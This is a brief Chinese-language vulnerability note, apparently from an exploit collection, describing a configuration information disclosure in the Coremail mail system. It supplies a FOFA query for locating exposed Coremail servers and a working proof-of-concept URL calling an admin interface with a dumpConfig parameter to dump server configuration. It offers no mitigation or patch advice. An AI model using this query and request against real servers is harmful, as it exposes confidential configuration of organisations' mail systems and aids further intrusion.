# Coremail-配置信息泄露漏洞

##  漏洞描述

Coremail 某个接口存在配置信息泄露漏洞，其中存在端口，配置信息等

## 漏洞影响

> [!NOTE]
>
> Coremail-配置信息泄露漏洞

## FOFA

> [!NOTE]
>
> app="Coremail邮件系统"

## 漏洞复现

POC为

```
http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState&dumpConfig=/
```

![](Coremail-配置信息泄露漏洞.assets/1627363152396676.jpg)

## Goby & POC

> [!NOTE]
>
> Coremail configuration information disclosure

![](Coremail-配置信息泄露漏洞.assets/1627363152794697.jpg)